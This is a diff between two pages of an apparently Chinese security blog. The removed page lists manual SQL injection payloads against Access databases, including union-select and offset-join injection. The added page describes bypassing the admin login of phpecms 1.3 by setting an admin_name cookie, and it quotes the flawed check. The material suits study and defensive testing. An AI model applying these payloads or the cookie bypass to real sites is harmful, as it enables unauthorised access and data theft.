@@ -15,19 +15,21 @@
 
 
 
-<meta name="description" content="Access（数据库后缀名为：.mdb） 数据库结构：">
+<meta name="description" content="title:cookie 欺骗进后台听说没有“实战”的博客不是好博客。就下载了个CMS来测试下性能–&amp;gt;phpecms1.3">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL手工注入之Access">
-<meta property="og:url" content="http://yoursite.com/2017/04/08/SQL手工注入之Access/index.html">
+<meta property="og:title" content="大佬要我改个名">
+<meta property="og:url" content="http://yoursite.com/2017/04/21/Cookie欺骗进后台/index.html">
 <meta property="og:site_name" content="大佬要我改个名">
-<meta property="og:description" content="Access（数据库后缀名为：.mdb） 数据库结构：">
-<meta property="og:image" content="http://i.imgur.com/36xkh4X.png">
-<meta property="og:updated_time" content="2017-04-10T10:00:44.813Z">
+<meta property="og:description" content="title:cookie 欺骗进后台听说没有“实战”的博客不是好博客。就下载了个CMS来测试下性能–&amp;gt;phpecms1.3">
+<meta property="og:image" content="http://i.imgur.com/kYyuq5t.png">
+<meta property="og:image" content="http://i.imgur.com/OytbVIS.png">
+<meta property="og:image" content="http://i.imgur.com/kFr4Ff3.png">
+<meta property="og:updated_time" content="2017-04-21T15:35:34.859Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL手工注入之Access">
-<meta name="twitter:description" content="Access（数据库后缀名为：.mdb） 数据库结构：">
-<meta name="twitter:image" content="http://i.imgur.com/36xkh4X.png">
+<meta name="twitter:title" content="大佬要我改个名">
+<meta name="twitter:description" content="title:cookie 欺骗进后台听说没有“实战”的博客不是好博客。就下载了个CMS来测试下性能–&amp;gt;phpecms1.3">
+<meta name="twitter:image" content="http://i.imgur.com/kYyuq5t.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +61,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>SQL手工注入之Access | 大佬要我改个名</title>
+<title>大佬要我改个名</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -270,11 +272,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-SQL手工注入之Access" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Cookie欺骗进后台" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/04/08/SQL手工注入之Access/" class="article-date">
-      <time datetime="2017-04-08T09:11:27.016Z" itemprop="datePublished">2017-04-08</time>
+      <a href="/2017/04/21/Cookie欺骗进后台/" class="article-date">
+      <time datetime="2017-04-21T10:47:59.249Z" itemprop="datePublished">2017-04-21</time>
 </a>
 
 
@@ -285,58 +287,65 @@
       <input type="hidden" class="isFancy" />
     
     
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      SQL手工注入之Access
-    </h1>
-  
-
-      </header>
-      
-      <div class="article-info article-info-post">
-        
-
-        
-        <div class="clearfix"></div>
-      </div>
-      
-    
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Access（数据库后缀名为：.mdb）</p>
-<p>数据库结构：<br><a id="more"></a><br><img src="http://i.imgur.com/36xkh4X.png" alt=""></p>
+        <hr>
+<h2 id="title-cookie-欺骗进后台"><a href="#title-cookie-欺骗进后台" class="headerlink" title="title:cookie 欺骗进后台"></a>title:cookie 欺骗进后台</h2><p>听说没有“实战”的博客不是好博客。<br>就下载了个CMS来测试下性能–&gt;phpecms1.3</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>登陆页面：<br><img src="http://i.imgur.com/kYyuq5t.png" alt=""></p>
 <hr>
-<ol>
-<li>判断是否存在注入（报错，“*”and/or;在网址最后输入（’；）,返回不正常的时候,说明是access类型的。反之，则是mssql类型）</li>
-<li>判断数据库表名：and exists(select * from [表名])</li>
-<li>判断数据库列名：and exists(select [列名] from [表名])</li>
-<li>判断字节长度：order by 数字</li>
-<li>联合查询注入：union select 1,2,… from [表名]</li>
-<li>根据数字位置爆数据。</li>
-</ol>
+<p>phpecms1.3/admin/cms_check.php文件有一段代码</p>
+<pre><code class="bash">&lt;?php
+        <span class="keyword">if</span>(!isset(<span class="variable">$_COOKIE</span>[<span class="string">'admin_name'</span>])){
+                alert_href(<span class="string">'非法登录'</span>,<span class="string">'cms_login.php'</span>);
+        };
+?&gt;
+</code></pre>
+<p>这代码意思是如果cookie是admin_name 则跳转成功，如果是其它则非法登陆。</p>
 <hr>
-<p>偏移注入（知道表名却不知道列名的情况下使用）：<br>假设表名为admin。初始字段数为12</p>
-<ol>
-<li>判断字段数（order by ）</li>
-<li>爆显示位</li>
-<li>用“<em>”代替字符，计算</em>代替字符的位数</li>
-<li>当访问：<a href="http://127.0.0.1/0/Pro/P.asp?id=1513" target="_blank" rel="external">http://127.0.0.1/0/Pro/P.asp?id=1513</a> UNION SELECT<br>1,2,3,4,5,6,7, <em>  from admin 页面返回正确（说明admin表有7个字段）<br>if：已经减去了五个字段<br>则</em> = 5个字符<br>2 x * = 10个字符<br>12-10=2个字符</li>
-<li><a href="http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513" target="_blank" rel="external">http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513</a> UNION  SELECT 1,2,a.id,b.id, * from (admin as a inner join admin as b on a.id=b.id)</li>
-<li>如果不显示可以查看元素看看是不是隐藏了</li>
-<li>真没有就二级偏移注入。。</li>
-<li>再减7个字段 POC写成：<br>UNION  SELECT 1,2,a.id,b.id,c.id * from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=b.id)</li>
-<li>三级。。。</li>
-<li>四级。。。。<br>。。。</li>
-</ol>
-<hr>
-<p>跨库注入（知道数据库的绝对路径，然后猜表名）：</p>
-<ol>
-<li>and exists(select * from 数据库绝对路径.表名)</li>
-</ol>
+<p>/phpecms1.3/admin/cms_welcome.php文件：</p>
+<pre><code class="bash">&lt;?php
+include(<span class="string">'../system/inc.php'</span>);
+include(<span class="string">'cms_check.php'</span>); 
 
+?&gt;
+&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;
+&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;
+&lt;head&gt;
+&lt;?php include(<span class="string">'inc_head.php'</span>) ?&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php include(<span class="string">'inc_header.php'</span>) ?&gt;
+&lt;div id=<span class="string">"content"</span>&gt;
+        &lt;div class=<span class="string">"container"</span>&gt;
+                &lt;div class=<span class="string">"line-big"</span>&gt;
+                        &lt;?php include(<span class="string">'inc_left.php'</span>) ?&gt;
+                        &lt;div class=<span class="string">"xx105"</span>&gt;
+                                &lt;div class=<span class="string">"hd-1"</span>&gt;使用声明&lt;/div&gt;
+                                &lt;div class=<span class="string">"bd-1"</span>&gt;
+                                &lt;p&gt;一、遵守中中华人民共和国相关法律，合法使用。&lt;/p&gt;
+                                &lt;p&gt;二、此程序为免费版，无使用时间限制。&lt;/p&gt;
+                                &lt;p&gt;三、商业使用建议使用收费版，获取更多功能和技术服务。&lt;/p&gt;
+                                &lt;p class=<span class="string">"fb color-red"</span>&gt;免费版和收费版的主要差异&lt;/p&gt;
+                                &lt;p&gt;一、支持手机版&lt;/p&gt;
+                                &lt;p&gt;二、多套模板后后台切换&lt;/p&gt;
+                                &lt;p&gt;三、更多的频道类型和详情类型选择&lt;/p&gt;
+                                &lt;p&gt;四、支持伪静态&lt;/p&gt;
+                                &lt;p&gt;四、咨询QQ：&lt;a href=<span class="string">"http://wpa.qq.com/msgrd?v=3&amp;uin=5474131&amp;site=qq&amp;menu=yes"</span>&gt;5474131&lt;/a&gt; 电话：13400472755 网址：&lt;a href=<span class="string">"http://www.pcfinal.cn"</span> target=<span class="string">"_blank"</span>&gt;[url=http://www.pcfinal.cn]www.pcfinal.cn[/url]&lt;/a&gt;&lt;/p&gt;
+                                &lt;/div&gt;
+                        &lt;/div&gt;
+                &lt;/div&gt;
+        &lt;/div&gt;
+&lt;/div&gt;
+&lt;?php include(<span class="string">'inc_footer.php'</span>) ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>后台文件没有任何判断，直接包含进去</p>
+<hr>
+<p>如图增加新cookie及修改：<br><img src="http://i.imgur.com/OytbVIS.png" alt=""></p>
+<p>刷新修改过的URL，成功进入后台</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="http://i.imgur.com/kFr4Ff3.png" alt=""></h2>
       
     </div>
     
@@ -344,13 +353,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/04/08/SQL手工注入之Access/">SQL手工注入之Access</a></p>
+        <p><span>本文标题:</span><a href="/2017/04/21/Cookie欺骗进后台/"></a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mark</a></p>
-        <p><span>发布时间:</span>2017-04-08, 17:11:27</p>
-        <p><span>最后更新:</span>2017-04-10, 18:00:44</p>
+        <p><span>发布时间:</span>2017-04-21, 18:47:59</p>
+        <p><span>最后更新:</span>2017-04-21, 23:35:34</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/04/08/SQL手工注入之Access/" title="SQL手工注入之Access">http://yoursite.com/2017/04/08/SQL手工注入之Access/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/08/SQL手工注入之Access/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/21/Cookie欺骗进后台/" title="">http://yoursite.com/2017/04/21/Cookie欺骗进后台/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/21/Cookie欺骗进后台/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -363,17 +372,11 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/04/08/SQL手工注入之mssql/">
-                    SQL手工注入之SQL Server（mssql）
+                <a href="/2017/04/21/解析漏洞/">
+                    解析漏洞总结
                 </a>
             </div>
         
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/04/08/SQL手工注入之Oracle/">
-                    SQL手工注入之Oracle
-                </a>
-            </div>
         
     </nav>
 
@@ -383,7 +386,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#title-cookie-欺骗进后台"><span class="toc-number">1.</span> <span class="toc-text">title:cookie 欺骗进后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-1"><span class="toc-number">3.</span> <span class="toc-text"></span></a></li></ol>
         
     </div>
     <style>
@@ -419,7 +422,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"SQL手工注入之Access　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -439,7 +442,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/04/08/SQL手工注入之mssql/" title="上一篇: SQL手工注入之SQL Server（mssql）">
+            <a href="/2017/04/21/解析漏洞/" title="上一篇: 解析漏洞总结">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -447,9 +450,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/04/08/SQL手工注入之Oracle/" title="下一篇: SQL手工注入之Oracle">
-                <i class="fa fa-angle-right"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
 
